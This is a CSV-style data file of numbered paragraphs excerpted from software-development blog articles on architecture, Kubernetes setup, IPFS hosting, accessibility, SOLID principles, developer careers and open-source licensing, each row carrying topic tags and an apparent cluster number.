3014,"Using a better tool doesnt imply Garbage in -> Quality out. A better tool just outputs garbage faster. While we might be able to perform a few more iterations because of the tools we still get nothing more than: Garbage in -> Garbage out. Repeat Tools are facilitators, not creators. While todays software tools can generate application shells or data entry forms, such tools have no control over whether they are the right data entry forms. To ensure were building the right thing requires analysis of the business problem and thoughtful design by a qualified architect.",['Software Development'],12
3015,"But, you may ask, arent faster machines, faster networks, better languages, and more powerful databases essential to success? Since virtually all development is done within the constraints of a budget each decision must be weighed carefully. Failure to meet budget is still failure. The fact that the system runs fast isnt of much comfort if youre brokeor too late. Likewise, all the statistics in the world wont help you run faster if your system doesnt rely on the features of the product being benchmarked.",['Software Development'],12
3016,"The typical result of an evangelist acting as an architect is a structure designed using a single material. This is analogous to building an entire structure out of glass block. Doors, windows, walls, floors, and ceilings, everything is glass block. Glass block has wonderful performance characteristics. Anyone can learn to use glass block.",['Software Development'],12
3017,"If it sounds strange in traditional construction, why do we accept it in software? Anyone can learn to use C++. What starts out as a seemingly harmless infatuation with a technologys strengths rapidly becomes a projects worst nightmare.",['Software Development'],9
3018,"With a little imagination its possible to draw analogies between programming languages and structural materials. For example, one could imagine C++ as structural steel. And it isnt easy to change once it has been put in place. A bit less strength, a bit less load handling, but easier to manipulate. If C++ is steel and Java is wood, HTML is like putty, light, easy to manipulate, and easy to alter. The choice of which to use depends on project requirements.",['Software Development'],9
3019,"If the customers focus is on what needs to be done, the architects focus is on how to accomplish it. The architect translates a customers definition of what is needed into blueprints describing how it can be built. Doing this requires the ability to ask effective questions. Usually when a project fails because requirements changed unexpectedly its because the architect didnt do their job. Requirements dont change as fast as we like to thinkthey just get discovered during development instead of design. During construction, the architect serves as a liaison between the customer and the various personnel involved in construction.",['Software Development'],0
3020,"With a dynamic class created with open Class, we can use that as a hook for our CSS animations. The base state of the class tied to the is Open property, and we can toggle it by creating the change handler for v.is Open. That handler calls a c.handle Is Open Toggle method in our controller that does the work of actually adding the class. A simple way to do it is like as follows: So, now successfully adding a class to our modal based on the is Open state. Now, lets try to add the CSS animation. Here, Ive only showed the changed lines: This is the CSS we need for now, which adds an animated state on both the backdrop and the modal itself.","['Salesforce Lightning', 'Front End Development', 'Salesforce Development', 'UI', 'Salesforce']",15
3021,"Next, in our component, instead of removing the HTML for the modal when is Open is false, we remove it when the open State is closed. Its a quick change to start the modal with a line like this: Now, lets adjust our change handler to cycle through the states after our defined delay, so our new controller looks a bit like this: So, our toggle takes a look at the is Open value, and cycles through the appropriate opening/closing states as needed. The closed and closing states now work perfectly, and is an exact representation of our cycles. The opening and open states have a bit of oddity to themnote the 1 value for the set Timeout call, instead of using open Delay. This goes back to the same reasons as above, where the CSS animation needs a before and an after state to show the transition. Speaking of which, heres our revised CSS: That should do it! Note we havent done anything fancy with renderers yet in Lightning, thats because were not doing any direct DOM manipulation. In my next post, well expand on this technique a bit further, using the open States technique along with a render handler on an accordion, so we can animate the height of the accordion appropriately.","['Salesforce Lightning', 'Front End Development', 'Salesforce Development', 'UI', 'Salesforce']",15
3022,"Its important that you approach HTML and CSS separate. Its totally fine to use an <a> element in code and then style it like a button. Your HTML markup should make sense on its own, without the styling. Thats why libraries like Twitters Bootstrap provide classes for various typographic choices in addition to the default element styling. I recommend using classes as much as possible over type selector styling. Your life will be much easier later on, I promise.","['Accessibility', 'Development', 'Front End Development', 'HTML', 'CSS']",19
3023,"Heres a short list of cases to check on your website or application: Titles are wrapped in H1 to H6 tags. That doesnt mean every title needs to be a heading element. Think of writing a text document e.g. When would you style a line of text as a title? When would you make something bold? Just be aware that people using screen readers love to use the H1 to H6 tags to jump around your content. By contrast, boldness of a text, even when marked with a <strong> tag, doesnt have any influence on how the screen reader accesses and reads your content.","['Accessibility', 'Development', 'Front End Development', 'HTML', 'CSS']",19
3024,"Change the default focus style to something more visible: Browsers implement the default focus style very differently. Some browsers show a blue outline when an element is focused. Thats okay on a white background but not on a blue background. Some browsers like Firefox only show a dashed/dotted line around focused elements which is barely visible. Never rely on the default focus style. For the latest browsers, there is now even a modifier for keyboard-only focus, so you can make a difference between focusing via mouse click and keyboard.","['Accessibility', 'Development', 'Front End Development', 'HTML', 'CSS']",19
3025,"As part of this post we will be performing following steps Enable Continuous Deployment trigger Modify source code to trigger CI CD pipeline Verify the CD pipeline Continuous Deployment is an important part of Dev Ops journey for teams staring to move into full CI CD mode. It allows teams to continuously deploy changes to an environment as and when the development team makes changes to the source code. Lets start with checking the current state of our website. If I browse the public DNS of the agent node, I am presented with the home page I would like to make a small change to the code and would like to see the changes deployed to the environment automatically. To do that we need to change the way code is currently being deployed. In the last post, we manually triggered the release and then the deploy phases. VSTS provides us the facility to automate this part. Go to the release definition and edit it.","['Docker', 'Vsts', 'Azure', 'Docker Swarm', 'Cd']",18
3026,"In this blog post we are going set up an API using Go, Graph QL, and Postgre SQL. Ive gone through a few different iterations on the structure of this application and so far this is the one I like the best. For the most part, my background in writing web APIs has been with N __url__ and Ruby/Rails. Im finding that this created a bit of a struggle when first trying to figure out designing web apis in Go. One article that was really helpful to me was Structuring Applications in Go by Ben Johnson. It has influenced some of the code in this tutorial and I recommend reading! First things first, lets start by getting the project set up. Ill be using mac OS for the tutorial but for the most part that wont matter. Here are links to setting up Go and Postgre SQL on mac if you dont have them on your machine. Below is a link to the code in full for reference: Create a new project - well call it go-graphql-api. To make it easier lets also create the whole project structure right away.","['GraphQL', 'Golang', 'API', 'Tutorial', 'Software Development']",6
3027,"Hosted apps: Running on this type of compute product means you share more resources with other products. After you build your app, you hand it over to the cloud provider and theyre responsible for scaling it. Placing that control in the hands of the service provider reduces costs for you. Examples include Amazon Elastic Beanstalk, Google App Engine, and Heroku.","['Cloud Computing', 'Infrastructure', 'Site Reliability', 'Google Cloud Platform', 'Serverless']",10
3028,"Itll happen, and its a good thing. Because you will gain an opportunity to learn something new. When this happens, its a chance to be vulnerable and admit you made a mistake. Being vulnerable is what opens us up to making the best connections with those around us. It is a chance to improve your knowledge and make better connections with your team. Admit your mistakes early and youll find others more likely to help you fix the problem you may have caused.","['Programming', 'Software Development', 'Software', 'Careers', 'Experience']",4
3029,"Sometimes the client doesnt really know what they want. This is one of the hardest challenges in software. There are tools and techniques to try alleviate this, but some clients just wont play along. You will face difficult clients, theres no doubt about that. Ive faced a few and I can tell you its not a lot of fun. Every situation is different, use your knowledge and tools carefully as you try to navigate these treacherous adventures.","['Programming', 'Software Development', 'Software', 'Careers', 'Experience']",0
3030,"When people hear you are a software developer. They often only hear one thing. Now, in most of the world, this isnt true compared to the ridiculous amounts you see new graduates getting in Silicon Valley. For example, here in New Zealand, you can expect to earn slightly more than the average salary at first, raising to a pretty good amount of money after some time. Its nowhere near what you see elsewhere, but on average, youll be better off than a lot of others. Money can make things difficult between friends, and even family. Though most troubles can be avoided by simply not talking about it, thats not always the best approach. So try to keep this in mind.","['Programming', 'Software Development', 'Software', 'Careers', 'Experience']",2
3031,"Delivery is the responsibility of the team. Clear focus of the PO in prioritising business value working through stakeholders, working with the BA/ team to clarify key requirements, getting business people involved, ensuring internal and external marketing strategies in place and the business support required for make the product successful are planned and executed correctly should remain the full time focus of the PO (than delivery and team mechanics)Business Analyst (BA) reports into Product owner: BAs are usually part of the scrum team and play an important role in large organisations to breakdown the requirements and systems dependancies. Since a product owner is in the driving seat for prioritising and shaping the product, a BA may tend to follow the PO, sometimes without thinking independently. It is up to the BA to work with the stakeholders and the development team to break down the real requirements behind the user stories so that the team gets a fair chance to understand the implementation complexity. Underestimating the effort for a user story is often requirements not clarified.","['Agile', 'Mistakes', 'Enterprise', 'Agile Coach', 'Scrum Mistakes']",1
3032,"Using MQTT: MQTT is a light-weight messaging protocol for Io T devices. I used MQTT in one of the projects before. Its basically a giant public chatroom of Io T devices hosted by these MQTT broker services. When you want to post a message into the chatroom, you need to prefix your message with a topic. You can subscribe to some certain topics to receive any messages on that topic. You can also subscribe to a prefix to some topicfor example, if you subscribe to /device/gateways/#, and all the gateways will publish their messages in /device/gateways/<gateway-id>, you can see all the messages published by all the gateways automatically.","['Golang', 'Internet of Things', 'IoT', 'Engineering', 'Sensors']",11
3033,"The second thing I noticed was that it almost took me forever to deploy all the services and start them in the correct order manually. I had to start the My SQL daemon and then run the migration script. After all the systems are running, I can finally start the Graph QL server as well as the MQTT worker. I want to create a script that automates this entire process so I can create/deploy/destroy infrastructures easily.docker-compose piqued my interest. When I worked with containerized services, I mainly used docker to build and start/stop the container. I read about that docker-compose is capable of running pre-defined scripts that choreographs the containers to start and stop in order and with customizable arguments. After rounds of trials and errors, I ended up with a pretty satisfying script.","['Golang', 'Internet of Things', 'IoT', 'Engineering', 'Sensors']",7
3034,"A Kubernetes cluster is a powerful tool. It gives you the power to deploy your containerized workloads, automatically scale them, and schedule them across multiple machines. It can even open up a load balancer for your service to be exposed to the world (assuming youre running in a supported cloud). Unfortunately, all of this functionality doesnt come out of the box. You need DNS entries, path-based routing, TLS certificates, metrics, scaling, and role-based access control (RBAC). Over time at Reactive Ops we have developed a set of tools that we run inside of every cluster which provide those various services. Our end goal is that any application can run in the cluster and have a human-readable address, a TLS cert, scale automatically, be able to utilize path-based routing, and only have the access that it needs. Thats no simple feat, with more than a few potential pitfalls along the way. This article should serve as a guide to taking a bare Kubernetes cluster and making it fully operational.",['Kubernetes'],11
3035,"This guide is going to consist largely of installing tools and controllers into your cluster. At Reactive Ops we use Helm, a Kubernetes package manager, to install most (or all) of the various tools we use. In order to use Helm, you have to install the tiller into your cluster. This can be done using the Helm cli, with a dedicated service account for tiller, like so: In addition to Helm, this guide is going to reference a Kubernetes deployment. If you are reading this, you already know what a deployment and a pod are. For ease of following the guide, I will be using the following deployment of a simple Nginx pod and building on it: Lets talk about how we get traffic from outside the cluster to your services running inside the cluster. There are a few different ways that Kubernetes allows us to do this natively, and we should explore those first.",['Kubernetes'],7
3036,"Load Balancer Services In a supported cloud provider, a Load Balancer service is awesome. It exposes a high port on all of the nodes in the cluster, and then it creates a cloud load balancer that uses that port to route traffic. The service definition is remarkably simple: This creates a cloud load balancer in your cloud provider and attaches it to the port that it created. If we look at the service now, we see a couple of interesting things: First, we see that there is an external IP address marked as <pending> because our cloud provider is still creating the resource. Second, we see that the port listed for the service is 80:32732. This indicates that the service has exposed a Node Port that will be used as the listener port for the load balancer.",['Kubernetes'],11
3037,"All of this means that we now have a way to run tens or hundreds of services behind a single Nginx proxy (or group of them), and these proxies are configured using easy to deploy Kubernetes objects. We can even use this to create TLS certificates and DNS, as well see later. Right now we have a single cloud load balancer that handles TCP traffic to the controller, and we handle routing from inside the cluster. Heres a little diagram to bring it all together: Since we are using path- and name-based routing, we are going to need to create DNS entries. In the spirit of using controllers and other Kubernetes-native constructs, Reactive Ops uses a project called external-dns. This controller will watch for annotations and certain types of objects and create DNS entries based on them. It is also deployed with Helm: Note that credentials for your DNS provider will need to be specified as well, which depends on which DNS provider you are using.",['Kubernetes'],11
3038,"Now that we have HTTP traffic to our services and easily accessible names, we want to secure them. HTTPS has become the de facto standard now that search engines optimize for it and browsers give ugly warnings if its not there. Traditionally this has been a pain point for operations teams. Back then, we had to generate the certs and do validation (sometimes from a manual portal), and then the certs still had to be deployed. Depending on the application we had to update application code or restart web servers. In the modern age, we have a few different options.",['Kubernetes'],11
3039,"Cloud Provider Cert Storage Amazon provides Amazon Certificate Manager (ACM). Combined with a Load Balancer service and a special annotation, we can utilize an ACM cert to terminate TLS before it gets to the cluster. ACM automatically renews the certificate if you generate it using Route53 DNS. In a similar fashion, the ingress controller can incorporate a wildcard ACM certificate with its load balancer. This means that any Ingress we create that uses a domain in the wildcard gets TLS for free. This is a good option for a small number of services as long as you are comfortable with a wildcard. Some security policies dont allow for it, and sometimes you want more than one subdomain. For another auto-validating option, we look further.",['Kubernetes'],11
3040,"In order to deploy cert-manager, we use Helm again: Once the controllers running, there are a few more pieces that need to be set up. There are two ways to do domain validation for certificates. We prefer to use DNS01 where possible at Reactive Ops. In order to do this, your cluster nodes (or the cert manager) must have access to modify your DNS providers records. This is outside scope for this article, but it can be done with node roles in your cloud provider. The other option is to create a service account that you would then use in the following step.",['Kubernetes'],11
3041,"Next you create an Issuer or Cluster Issuer which is responsible for configuring your Lets Encrypt account and setting up the validation method that youre going to use. For this guide I will use a Cluster Issuer and connect it to Lets Encrypt. This is done by creating another Kubernetes resource: There are a few things going on here: Its using Google Cloud DNS for validation Its using a service account for permissions to update DNS. The service account credentials are stored in a secret called dns-gcloud-config The email address will be your Lets Encrypt account name. Renewal email warnings will go here This points at the Lets Encrypt prod endpoint, so it will make valid certificates Once you apply this resource, the cert-manager controller will attempt to set up your Lets Encrypt account. If you do a kubectl describe clusterissuer letsencrypt-prod, youll see a few lines like this at the bottom of the output indicating your account was registered: Now that you have an issuer and we have the ingress controller, we can redeploy our Ingress object to utilize cert-manager: Notice the annotations that specify an ssl redirect and which Cluster Issuer to use in addition to the TLS block at the bottom of the ingress. There is also a secret name specified that cert-manager will use as the name for the certificate. We can verify that all of this is created like so: So now we have a functional ingress with automatic TLS encryption routing traffic to our cluster. This leaves one more piece of the puzzle in order to have a fully operational service in Kubernetes.",['Kubernetes'],7
3042,"Im going to lump scaling and metrics together because we cant scale an application without some sort of metrics to scale on, and they can be configured quickly and easily together. Kubernetes has a built-in mechanism called a horizontal pod autoscaler that can be used to maintain the number of replicas in a deployment based on metrics. In order to do this, we have to expose the metrics to the Kubernetes API. Unless youre on GKE, which gives you this automatically, the easiest way to get metrics is to deploy the metrics-server into the cluster. This is very simple using Helm: Once the controller starts and metrics are populated, we should be able to see resource utilization of pods and nodes like so: With metrics available, we can create a horizontal pod autoscaler (HPA) for our deployment. The HPA is defined as another object and looks like this: After a few minutes you can look at the HPA and see the current status: This setup will watch the CPU usage of the pods and try to keep them at or below 80% utilization based on the CPU limits set on the deployment (see the original deployment). If the utilization goes too high, the HPA will scale up, and if it goes down for a time, it will scale down. This behavior can be changed to use any metric via a custom metrics provider. Tuning this correctly will allow your deployment to handle many varying traffic and load problems.",['Kubernetes'],11
3043,"Out of the box theres a bunch of resources that you can define:serviceaccountsclusterrolebindingsrolebindingsrolesclusterroles Keeping these straight is confusing, and modifying permissions usually requires multiple sets of definitions. Reactive Ops utilizes a controller that we wrote to make it simpler called rbac-manager. We can install it with (you guessed it) Helm: We can now create an object called an rbacdefinition in order to manage our permissions and service accounts. Lets go ahead and create one for our CI/CD system to use: Applying this will create a service account called ci and bind it to the cluster role cluster-admin. In the future we can generate a kubeconfig file for our ci system using that service account. Going forward we can add to this in order to finely control all permissions for users and service accounts in the cluster.",['Kubernetes'],7
3044,"You just installed a TON of tools into your cluster and added a lot of functionality. Ingress Controller For routing and TLS termination into the cluster External DNSManages your DNS records for your ingresses Cert Manager Generates and maintains TLS certificates for the ingresses Metrics Server For enabling the use of Horizontal Pod Autoscalers Cluster Autoscaler For managing cluster size based on pods RBAC-Manager For managing your cluster permissions All of these required one or more Helm charts to install, and may require different values depending on customizations that you want to make. It can be frustrating to run these commands and maintain these values files, especially if you manage multiple clusters. Reactive Ops utilizes a homegrown tool called Autohelm to manage all of these charts. It allows you to maintain a single file that defines all of the charts you want to use. There are examples of all the different charts being deployed in the examples.md.",['Kubernetes'],11
3045,"Success of any project depends on the ability of a development team to meet their clients needs. The communication between the client and the development team plays a vital role in delivering a solution that fits product and market requirements. The issues arise if customers explain their needs too vaguely and the team cant understand clear requirements and eventually the business problem behind them. Imagine that you ask your team to enable users to search for a product in an online bookstore by categories. You expect to have a clear interface with category links to click on them (e.g. After two weeks of development, you receive a search bar feature where users must type in the category they interested in, instead of browsing pre-listed categories. While this also works, your initial goal was to expose all available categories and let users explore further.","['Agile', 'Startup Lessons', 'Project Management', 'Software Development', 'Business']",0
3046,"Some of the criteria are defined and written by the product owner when he or she creates the product backlog. And the others can be further specified by the team during user stories discussions after sprint planning. There are no strict recommendations to choosing the person responsible for writing the criteria. The client can document them if he or she has ample technical and product documentation knowledge. In this case, the client negotiates the criteria with the team to avoid mutual misunderstandings. Otherwise the criteria are created by a product owner, business analyst, requirements analyst, or a project manager.","['Agile', 'Startup Lessons', 'Project Management', 'Software Development', 'Business']",0
3047,"Acceptance criteria have to be documented before the actual development starts. This way, the team will likely capture all customer needs in advance. In the beginning, its enough to set the criteria for a small number of user stories to fill the backlogs for two sprints (if you practice Scrum or a similar method). They must be agreed by both parties. Then the documented acceptance criteria are used by developers to plan the technical process.","['Agile', 'Startup Lessons', 'Project Management', 'Software Development', 'Business']",1
3048,"One of the themes that has popped up throughout our SOLID series is that of decoupling. In short, this theme argues that entities (objects, modules, functions, etc.) in a software program should be loosely coupled so as to prevent changes in one place from propagating to another. The reason this is desirable is that loosely coupled entities are easier to maintain, more flexible, and more mobile. We reviewed some of the reasons why this is the case in part 2 of the series, which covered the Open/Closed Principle, and in part 3, which covered the Liskov Substitution Principle. And yet, decoupling is so important that there is still more to say on the topic, namely, how to avoid so-called interface pollution, wherein classes are unnecessarily forced to implement behaviors that they dont need. It is here that our next SOLID principle appears: the Interface Segregation Principle.","['Software Development', 'Software Engineering', 'Coding', 'Programming', 'Learning To Code']",12
3049,"As we discussed in our review of the Open/Closed Principle, interfaces are a means of programming with abstractions rather than concretions. An interface serves as a kind of contract between two objects that interact with one another. Rather than depending directly on one another, each object instead depends on the intermediary interface. The client object (the one using another objects behavior) doesnt have any knowledge of how the service object (the one that implements some behavior) is structured. For its part, the service object merely guarantees that it will implement behavior described in the interface without bothering to reveal how it will do so. As a result, the two objects are effectively decoupled since neither has a direct dependency on the other. Further, interfaces allow for the creation of multiple service objects that all implement some guaranteed behavior, meaning that a client object can exploit many different behaviors depending on which service object is being used (and all without ever knowing that different kinds of service objects even exist. )As useful as interfaces are, they raise an interesting conundrum: what happens when you want to create a service object that doesnt actually need all of the behaviors defined on its interface? Because an interface is a contract, you would be forced to define behaviors that are effectively useless. This is known colloquially as interface pollution because a class may become polluted with behaviors that it doesnt need. Worse yet, that pollution would propagate to any subclasses of a polluted superclass. This is a particularly insidious kind of coupling because it creates dependencies that dont do anything even marginally useful.","['Software Development', 'Software Engineering', 'Coding', 'Programming', 'Learning To Code']",9
3050,"As part of his SOLID principles, Robert C. Martin proposed a solution to this problem, which he called the Interface Segregation Principle (ISP) [1]. Martin argued that interface pollution was primarily the result of fat interfacesthat is, interfaces with a large number of prescribed methods. To counter the effects of fat interfaces, Martin defined the ISP as follows: If fat interfaces are problematic, then whats the alternative? Martin advocates for the use of so-called role interfaces, which are small interfaces that only contain methods that are of interest to the objects that use them. A fat interface may therefore be broken down into smaller role interfaces that guarantee specific related behaviors. Clients that require behaviors from multiple role interfaces may simply implement each of them. Meanwhile, clients that only need limited behaviors are not forced to live with unnecessary interface pollution. In other words, separate clients can and should have separate interfaces, which in turn limits coupling and cascading breakage.","['Software Development', 'Software Engineering', 'Coding', 'Programming', 'Learning To Code']",10
3051,"Here we have a C# program that describes the calculation abilities of two different classes: Basic Math Student, which uses a Basic Calculator; and, Advanced Math Student, which uses an Advanced Calculator. Both types of calculators implement the ICalculator interface, which defines the following behaviors: Add; Subtract; Multiply; Divide; Power; and, Square Root. When either type of student is asked to Calculate something, it uses a switch statement to identify the appropriate behavior and then uses its Calculator member to carry out the necessary operation. (Note: For the sake of brevity, were setting aside a few obvious improvements like an IMath Student interface, a possible Calculator class hierarchy, etc. )The above code works just fine and both of our student types are able to carry out the required behaviors; however, if you look at the Basic Calculator class you will see that it is polluted by having to unnecessarily implement the Power and Square Root methods. Our Basic Math Student is not expected to deal with exponents and thus does not need a calculator capable of those functions. This might seem innocent enough, but consider what would happen if either Basic Calculator or Basic Math Student had subclassesthe pollution would propagate to each of them, thus creating unnecessary dependencies. Furthermore, what if we decided that our Advanced Calculator should be even more capableperhaps with a few geometry-focused methods like Cos, Sin, and Tan? We would have to add corresponding contract definitions to ICalculator and then implement yet more unnecessary methods on Basic Calculator.","['Software Development', 'Software Engineering', 'Coding', 'Programming', 'Learning To Code']",9
3052,"In this version, instead of an ICalculator interface we have two role interfaces: IArithmetic; and, IExponents. The Basic Calculator only implements IArithmetic whereas Advanced Calculator implements both IArithmetic and IExponents. Note how our Basic Calculator is now free of pollution and yet we havent lost any functionality in our Advanced Calculator. Indeed, the program executes just as it did in the first version, except now we have fewer unnecessary couplings. Furthermore, if we wanted to add new functionality to our Advanced Calculator we could do so by defining new role interfaces, such as IGeometry, and implementing them as needed. Meanwhile, our Basic Math Student and Advanced Math Student classes have services that are specifically suited to their needs and expose no unnecessary behavior.","['Software Development', 'Software Engineering', 'Coding', 'Programming', 'Learning To Code']",9
3053,This part I just want to rant on the things I was struggling. If you dont like it feel free to skip it to the lessons sections.,"['Software Development', 'Python', 'React', 'Developer', 'Developer Stories']",4
3054,"Overtime, I found my gardening process actually very beneficial. When I was making a lot of trial-and-errors, I also learned many ways why things didnt work. Those errors surely built up my understanding to the technologies I was using. Also the more comfortable I dealt with errors, the more experiences I gained. So, my philosophy is to be the gardenerwrite as much code as you canwhen you dont have much experience, and youll learn from it! Im not a very strict TDD (Test Driven Development) person, but I enjoy writing tests. Trust me, writing tests is very beneficial if you are making a lot of changes in the code base. I had written code that was worse than spaghetti or lasagna. Itd be almost impossible to safely untangled my spaghetti code without tests.","['Software Development', 'Python', 'React', 'Developer', 'Developer Stories']",13
3055,"A huge help in making IPFS more accessible comes from Cloudflare, which just two months ago announced its free IPFS gateway offering through their CDN. Thanks to that, we can get a custom subdomain and point it to a website served via IPFS, and this is all transparent to our end users. In this article, well start by looking into one part of the Distributed Web, which is hosting static websites. These are web apps written in HTML and Java Script (with optional use of React, Angular, Vue, Svelte I could continue ad nauseam here), that are not connected to any database and do not have any server-side processing. If this sounds a bit limiting, well, it is, but at the moment I dont believe developers and technologists have really figured out a mature, comprehensive, and user-friendly way to build distributed backends. There are many projects attempting to do this (almost all of them based on blockchains), but a winner hasnt emerged. Regardless, with some creativity and relying on external APIs, you can still build very exciting apps, even without traditional backend servers.","['Ipfs', 'Distributed Web', 'DevOps', 'Static Site', 'Web Apps']",11
3056,"To start, create three nodes (Linux VMs) on your favorite cloud provider (Ill be using Azure in my example). Thanks to the distributed nature of IPFS, youll likely be fine using small nodes for your cluster, so this wont break the bank for you. Make sure that Docker is installed in each node, and that the following ports are open in the firewall (in addition to SSH):4001 (tcp) for IPFS9096 (tcp) for IPFS Cluster In my example, I have created three Ubuntu 18.04 LTS VMs (well be using containers, so the actual distribution isnt important) in Azure, in the US, Europe and Asia. While geo-distribution isnt a strict requirement, it will make our cluster more resilient and will serve data faster to users worldwide. Plus, it sounds a cool thing to do. Ive also installed Docker CE in all VMs.","['Ipfs', 'Distributed Web', 'DevOps', 'Static Site', 'Web Apps']",11
3057,"The website has already been published and its in the folder Qm VWPa TVSKq Z28q Aef QX3PYptj R3n Jgi T5Pugz1p PYsqvz, however its currently pinned only on one node. Lets add it to the pinset of our IPFS Cluster so all nodes can seed it: At this point we can test the web app. If you have the IPFS daemon installed and running on your laptop, you can open: Alternatively, you can use a gateway that shows IPFS over HTTP, like Cloudflares: One thing youll notice: the web page loads and you can see the title, but the content is empty! Lets open the Inspector: As you can see, the issue is that the static web app is trying to include the Java Script bundle at the path /bundle.js. Since our web app is not running in the root folder of the domain, that request fails. This is expected, and you can fix it by changing this line in the __url__ file (making the path relative rather than absolute), then repeating the steps above to publish the updated app: After making the change and re-publishing the app, the content id is now Qmak GEBp4HJZ6tk Fydbyv F6b Vv FThqf Awn QS6F4D7ie7h L, and the app is live at the following URLs: Note that the old content has not been removed, and it will be available for as long as theres at least one node seeding it. You can unpin it from the pinset to have it (eventually) removed from our nodes, but that doesnt guarantee that other IPFS nodes in the world will stop seeding it. Instead, read the next session for how to use IPNS.","['Ipfs', 'Distributed Web', 'DevOps', 'Static Site', 'Web Apps']",7
3058,"We now have the pipeline complete. Press Save & Queue to start a new build. After a few moments, it should be done building the app! After building the app, we need to publish the code on IPFS. For this, well be using the Releases tab under Pipelines. Open that, then click on the New pipeline button. Once again, do not pick a template, but instead click on Start with an empty job.","['Ipfs', 'Distributed Web', 'DevOps', 'Static Site', 'Web Apps']",18
3059,"Software Engineer salaries in San Francisco Bay Area (source: Linked In)Software Engineer salaries in Facebook, Google, Microsoft, etc (source: levels.fyi)In 2013, I was living in a room rented from a house shared with the landlord. At the age of thirty, I was particularly upset about this fact. I desperately wanted a job that could pay decently so that I could afford a decent life for myself, for my wife, and eventually for my children. I had discovered that I had a passion about programming from five years of writing data analysis and plasma physics simulation code in grad school. So I decided to become a Software Engineer, even though I didnt have a degree in Computer Science. Fortunately, it turns out it was the right choice. And because of that, I have fulfilled my wish about having a decent living for myself and my family.","['Coding', 'Education', 'Software Engineering', 'Life Lessons', 'Success Story']",2
3060,"There are too many resources available for learning data structures and algorithms. The key to progressing steadily is to focus on one resource and go through the topics persistently. For that, I strongly recommend the Geeksfor Geeks website. All the data structures and algorithms above are covered there. If somehow you find some content in the website hard to understand, my recommendation for plan B is search the topic on Youtube and watch some tutorials there.","['Coding', 'Education', 'Software Engineering', 'Life Lessons', 'Success Story']",14
3061,"Another recommendation is to mix your reading with exercising. There are two great websites for exercising coding problems: leetcode and lintcode. Both provide filtering by topic, so you can choose the problems in line with your recent learning. Now, here comes a much more important point: you will be using at least one of them many many times, before and after you become a Software Engineer, so use them well. Eventually you will find yourself spend a lot of time in exercising on those two websites. Learning the data structures and algorithms is by and large one-time effort. But exercising coding problems never ends, even after you become a Software Engineer. I used leetcode primarily myself, but lots of my friends strongly recommended lintcode, so I guess they may be equally valuable. Another note about these two websites is you will likely need to subscribe to their paid services for features you want. My experience is that the $99 subscription fee has been one of my best investments since.","['Coding', 'Education', 'Software Engineering', 'Life Lessons', 'Success Story']",2
3062,"When exercising on l(ee|in)tcode, you need a strategy. And it is not to be original. Namely, do not aim to solve every problems by your own ideas. You will not go too far with that approach. My recommendation is to think of a solution for yourself for 15 minutes. If you cannot come up with one, thats OK. Stop thinking. Study the best solution and internalize it. More important, make a note of it. Here is an example of my own note.","['Coding', 'Education', 'Software Engineering', 'Life Lessons', 'Success Story']",4
3063,"You will find tons of java tutorials online. I only recommend one: the official Java Tutorial website from Oracle. Now its important that you can successfully follow through the Jetbrains example mentioned above in the Set up a coding environment section, because it means you have a working playground to practice java programming. The official Java Tutorial website covers an extensive list of topics. However, I only recommend you go through these trails below in that order: Getting Started. Note that since you have the Hello World example working in Intellij IDEA, you dont have to follow along the hands-on Hello World example there, but please try to understand the text.","['Coding', 'Education', 'Software Engineering', 'Life Lessons', 'Success Story']",19
3064,"There are three important sections of a resume: experiences, education, and skills. Education is hard to change, but you can enrich the experiences and skills relatively quickly. I assume you have little to none relevant experiences, otherwise you probably wouldnt need to read this far. So, in that case, I recommend you make a website, and share the code in Github. The website should have a browser-based UI (ie, html + css + javascript), and a server-side application. Use gradle as the build tool for the server-side application. (If you dont know what this means, dont worry. The basics can be learned quickly, although you need to research.) In terms of the functionality of the website, choose something simple and hopefully interests you. For example, you can make a Todo list website, where people can log in and manage todo items (create, edit, mark done, etc). In my experience, working on such a project is much more fun than exercising on l(ee|in)tcode.","['Coding', 'Education', 'Software Engineering', 'Life Lessons', 'Success Story']",19
3065,"The development cycle itself is now much larger and will take more time. What should you code first and last? Maybe youll need a mix of programming languages instead of a single one this time. Maybe your new project requires things to be hosted on the cloud, so youll need to learn how to use AWS, GCP, or Azure! Testing needs to be done from the unit level all the way up to the end-to-end system. Simple edge cases could break the entire system! All in all, when taking on a new project, its a great idea to do something that pushes your skills to new levels, where you learn something really valuable.","['Programming', 'Machine Learning', 'Data Science', 'Technology', 'Innovation']",10
3066,"If you want people to use your project youll have to create something thats valuable to them. Doing projects where you learn different sorting algorithms and data structures is great, but theirs not really a ton of people that are going to say hey, I can really use this code right away in a real world scenario. Plus, if someone wants to learn about such things, theres already tons of resources out there online! Its much better if you can show how you used those skills to create something more. Did you use your understanding of algorithms to create an awesome encryption algorithm; or maybe a repository of many of them where you benchmark their speed and security? What about using your object-oriented programming skills to make a killer android app? That would definitely show others that you can code for android and in Java.","['Programming', 'Machine Learning', 'Data Science', 'Technology', 'Innovation']",9
3067,"For a Git Hub project, this starts first with good documentation. You should be using Markdown documents for your README files so theyre easy to read. Markdown allows you to put things like titles, bold, italics, images, tables, and clickable links in your README document. Youll want to describe what your project is for, all its files, and perhaps a quick demo of how to use it! Youll also want the project itself to be easy to use. Code should be well written and clean so others can easily interpret it. It shouldnt be hard for people to download the code and use it right away; little overhead should be required for use. Keep the files themselves easy to interpret and navigate through. Using all of the functionality / modules in the project should be as easy as changing a command line argument in the main file.","['Programming', 'Machine Learning', 'Data Science', 'Technology', 'Innovation']",18
3068,"Recently Redis Labs announced Commons Clause License that caused quite a bit of uproar among the open source communities. One reason for the uproar was a marketing spin implying it is an open source license. Even though the license applies only for their proprietary add-ons than the core Redis itself, the pushback is real. But, in their quest to a pushback against Commons Clause, there is little discussion on the reason behind this move by Redis Labs. Even though I do not agree with Redis Labs move, I have been vocal about the underlying cause. I call this Robin Hoodization of OSS and I will use a question-and-answer format to address the issues surrounding this.","['Open Source', 'AWS', 'Cloud Computing', 'Containers', 'Kubernetes']",10
3069,"I am borrowing the term Robin Hood from the English folklore where he strips money from the rich and gives it to poor. I am using the term loosely and I am not making an exact mapping with the story which itself has several forms. I am using the term to imply that value is taken away (albeit legally) from one group and delivered to another group who gain from the derived value. By Robin Hoodization of OSS, I mean that hyperscale cloud providers (specifically AWS and more about it later) take the value from OSS but their contribution back to OSS is not commensurate with the value they derive from OSS. This is not just restricted to hyperscale cloud providers. Every technology company, including pure play open source companies, take more value from OSS than their contribution back to the project. So, it is actually about value derivation per unit of contribution.","['Open Source', 'AWS', 'Cloud Computing', 'Containers', 'Kubernetes']",16
